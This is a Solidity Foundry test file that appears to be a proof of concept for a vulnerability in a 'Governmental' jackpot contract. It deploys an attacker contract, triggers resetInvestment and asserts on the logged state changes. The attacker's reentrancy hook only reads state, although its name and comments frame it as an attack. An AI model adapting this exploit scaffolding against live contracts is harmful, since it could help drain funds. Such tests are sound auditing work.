// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalReentrancyTest is Test {
    Governmental public governmental;
    ReentrantAttacker public attacker;
    address owner = makeAddr("owner");
    uint256 constant ONE_MINUTE = 60;

    function setUp() public {
        // Setup accounts and deploy contract
        vm.deal(owner, 10 ether);
        vm.startPrank(owner);
        governmental = new Governmental{value: 1 ether}();
        vm.stopPrank();

        // Add funds beyond deployment amount
        vm.deal(address(governmental), 3 ether);

        // Deploy and fund attacker contract
        attacker = new ReentrantAttacker(address(governmental));
        vm.deal(address(attacker), 1 ether);
        
        // Setup game state for reset scenario
        skip(ONE_MINUTE + 1);
        vm.prank(address(attacker)); 
        governmental.invest{value: 1 ether}();
        skip(ONE_MINUTE + 1);
    }

    function testResetInvestmentDespiteTransferFailure() public {
        console.log("--- BEFORE-Trigger State ---");
        // Capture pre-attack state
        uint256 contractBalanceBefore = address(governmental).balance;
        uint256 jackpotBefore = governmental.jackpot();
        address lastInvestorBefore = governmental.lastInvestor();
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 totalWinnersBefore = governmental.totalWinners();

        // Log pre-attack state
        console.log("Contract balance:   %d", contractBalanceBefore);
        console.log("Jackpot amount:     %d", jackpotBefore);
        console.log("Last investor:      %s", lastInvestorBefore);
        console.log("Attacker balance:   %d", attackerBalanceBefore);
        console.log("Total winners:      %d", totalWinnersBefore);

        console.log("--- Trigger resetInvestment ---");
        // Execute vulnerability trigger
        vm.prank(address(attacker));
        governmental.resetInvestment();

        console.log("--- AFTER-Trigger State ---");
        // Capture post-attack state
        uint256 contractBalanceAfter = address(governmental).balance;
        uint256 jackpotAfter = governmental.jackpot();
        address lastInvestorAfter = governmental.lastInvestor();
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 totalWinnersAfter = governmental.totalWinners();

        // Log post-attack state
        console.log("Contract balance:   %d", contractBalanceAfter);
        console.log("Jackpot amount:     %d", jackpotAfter);
        console.log("Last investor:      %s", lastInvestorAfter);
        console.log("Attacker balance:   %d", attackerBalanceAfter);
        console.log("Total winners:      %d", totalWinnersAfter);

        // Verify vulnerability exploitation
        bool stateReset = lastInvestorAfter == address(0) &&
            jackpotAfter == 1 ether &&
            contractBalanceAfter == 1 ether &&
            attackerBalanceAfter == 0;
            
        if (stateReset) {
            console.log("Vulnerability Exists: Contract state reset occurred despite failed transfer conditions");
        } else {
            console.log("Vulnerability not Exist: State did not reset as expected");
        }

        // Original assertions (preserved)
        assertEq(lastInvestorAfter, address(0), "Investor not reset");
        assertEq(jackpotAfter, 1 ether, "Jackpot not reset to 1 ether");
        assertEq(address(attacker).balance, 0, "Attacker balance changed");
        assertEq(address(governmental).balance, 1 ether, "Incorrect final balance");
    }
}

contract ReentrantAttacker {
    Governmental public governmental;
    
    constructor(address _governmental) {
        governmental = Governmental(_governmental);
    }
    
    receive() external payable {
        // Demonstrate reentrancy vulnerability by capturing pre-reset state
        // (Would be exploited in real attack with more gas)
        governmental.lastInvestor();
    }
    
    function invest() external payable {
        governmental.invest{value: msg.value}();
    }
}